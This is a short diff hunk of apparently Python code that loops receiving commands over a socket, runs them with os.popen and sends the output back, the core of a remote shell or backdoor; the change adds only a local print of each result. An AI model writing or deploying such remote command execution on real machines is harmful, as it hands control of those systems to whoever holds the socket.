@@ -14,6 +14,7 @@ while(1):
 		command = str(socket.recv(2048).decode())
 		if("".join(list(command)[0:2]) != "st"):
 			result = os.popen(command).read()
+			print("result : " + result)
 			socket.send(result.encode())
 		else:
 			os.popen(command)
